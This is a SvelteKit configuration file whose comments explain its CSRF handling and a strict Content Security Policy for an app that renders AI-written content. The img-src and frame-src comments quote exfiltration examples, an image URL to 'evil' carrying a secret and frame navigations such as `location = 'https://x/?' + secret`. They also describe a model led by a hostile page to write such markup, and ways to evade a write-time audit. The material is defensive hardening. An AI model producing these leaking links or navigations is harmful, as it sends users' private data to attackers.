import adapter from '@sveltejs/adapter-node';

/** @type {import('@sveltejs/kit').Config} */
const config = {
	kit: {
		// No `csrf` block, on purpose. SvelteKit refuses a POST, PUT, PATCH or
		// DELETE whose body is a form type (urlencoded, multipart, text/plain) when
		// its `Origin` header is not this server's own origin, and that is what
		// stops another site from sending one in a signed-in user's browser (a
		// `text/plain` POST needs no CORS preflight, and our handlers that call
		// `request.json()` parse it just the same). `trustedOrigins: ['*']` used to
		// switch the whole check off, for an internal OCR route that no longer
		// exists; nothing posts a form to this app cross-origin. A caller that is
		// not a browser (a script, Playwright's request context) sends no Origin
		// and must send its own. See docs/security-headers.md.
		// tests/integration/svelte-config-security.test.ts fails if a wildcard comes back.

		// Content Security Policy for rendered pages.
		//
		// SvelteKit builds and emits this header itself, which is why it lives
		// here rather than being hand-rolled in hooks.server.ts: `mode: 'nonce'`
		// makes it mint a per-request nonce, attach it to every script tag it
		// injects for hydration, and substitute it into the `%sveltekit.nonce%`
		// placeholders on the two hand-written inline scripts in src/app.html.
		// Hand-rolling that would mean re-implementing hydration script tagging.
		//
		// What ships to the browser is decided at RUNTIME by CSP_MODE, not here:
		// src/hooks.server.ts takes the header SvelteKit sets and either drops
		// it (off), moves it to Content-Security-Policy-Report-Only (the
		// default), or leaves it enforcing. The default is report-only, so this
		// policy cannot break the app before anyone has watched it on staging.
		//
		// Not configured via SvelteKit's own `reportOnly` option because that
		// one refuses to emit without a `report-to`/`report-uri` directive, and
		// there is no report collector here — the browser console on staging is
		// the collector.
		//
		// Only pages get this. Endpoint responses (the file previews in
		// particular) build their own Response objects and are untouched; see
		// src/lib/server/services/file-serving-response-policy.ts, whose exact
		// CSP string is load-bearing for the preview runtime's trust check.
		csp: {
			mode: 'nonce',
			directives: {
				'default-src': ['self'],
				// Nonce is added here automatically by `mode: 'nonce'`.
				'script-src': ['self'],
				// 'unsafe-inline' is unavoidable today and deliberate: Shiki emits
				// inline style attributes on every highlighted token, and mermaid
				// puts <style> elements inside the sanitized SVG that gets
				// {@html}-injected. Its presence also stops SvelteKit adding a
				// style nonce, which would silently *disable* 'unsafe-inline'.
				'style-src': ['self', 'unsafe-inline'],
				'style-src-attr': ['unsafe-inline'],
				// data: for inline SVG/preview URIs, blob: for the image preview
				// and the settings image pickers. NOT https: any more. A picture
				// the browser fetches is a request to whatever address the markup
				// names, with no click, and model-written markup can carry the
				// reader's data in that address (`![](https://evil/?q=<secret>)`);
				// a model that has just read a hostile page may write exactly that.
				// Every image the UI draws is same-origin: avatars, campaign and
				// model icons, the favicon proxy (/api/favicon), the Immich
				// thumbnail proxy, map tiles, chat files. A picture from the web
				// reaches a chat reply only as one of the search tool's thumbnails,
				// fetched by the server and served from
				// /api/image-search/thumbnail, and anything else the model links
				// shows as a link. See docs/security-headers.md.
				'img-src': ['self', 'data:', 'blob:'],
				// Every font is self-hosted woff2 under static/fonts. No Google Fonts.
				'font-src': ['self'],
				// Same-origin only: the browser never talks to a model provider,
				// a tile server or a favicon host directly — those are all proxied.
				// hooks.server.ts appends the Sentry DSN origin at runtime when
				// one is configured, so the DSN does not have to be known at build
				// time.
				'connect-src': ['self'],
				// pdf.js and MapLibre workers are same-origin; Sentry's replay
				// compression worker is built from a blob.
				'worker-src': ['self', 'blob:'],
				'child-src': ['self', 'blob:'],
				'media-src': ['self', 'data:', 'blob:'],
				'manifest-src': ['self'],
				// The document-workspace preview iframe is `srcdoc` + sandbox, so
				// it is an opaque origin rather than a framed URL, but keep this
				// tight anyway.
				//
				// This is the one directive enforced in EVERY mode but `off`, even
				// while CSP_MODE is report-only (src/lib/server/security-headers.ts
				// sends it as a Content-Security-Policy of its own beside the
				// report-only policy). A model-written App runs in a frame of these
				// pages and can navigate that frame to any address, which carries
				// whatever it knows in the URL: `location = "https://x/?" + secret`,
				// `window["loc"+"ation"]`, a meta refresh, an anchor click. The
				// App's own CSP cannot stop that and the write-time audit can be
				// evaded; the embedding page's frame-src can, and it answers for a
				// navigation the framed document starts itself. 'self' means a frame
				// of these pages can only ever be pointed at this app. Never widen it
				// (tests/integration/svelte-config-security.test.ts holds it, and
				// tests/e2e/app-frame-navigation.spec.ts proves it in a browser).
				'frame-src': ['self'],
				'object-src': ['none'],
				'base-uri': ['self'],
				'form-action': ['self'],
				'frame-ancestors': ['self']
			}
		},
		adapter: adapter({
			out: 'build',
			precompress: false,
			envPrefix: ''
		}),
		version: {
			pollInterval: 60000
		},
		alias: {
			'$lib': 'src/lib'
		}
	}
};

export default config;
